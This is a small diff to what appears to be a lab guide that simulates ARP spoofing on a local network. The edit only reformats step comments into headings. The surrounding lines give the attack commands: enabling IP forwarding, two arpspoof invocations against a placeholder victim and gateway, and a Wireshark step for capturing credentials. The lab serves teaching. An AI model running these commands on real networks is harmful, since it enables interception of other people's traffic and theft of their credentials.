@@ -87,13 +87,13 @@ This lab simulates an ARP spoofing attack to demonstrate vulnerabilities in loca
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
 
-# 2. Launch ARP spoof against victim and gateway
+### 2. Launch ARP spoof against victim and gateway
 arpspoof -i eth0 -t [victim_ip] [gateway_ip]
 arpspoof -i eth0 -t [gateway_ip] [victim_ip]
 
 
 
-# 3. Capture traffic (e.g., credentials) with Wireshark
+### 3. Capture traffic (e.g., credentials) with Wireshark
 
 
 
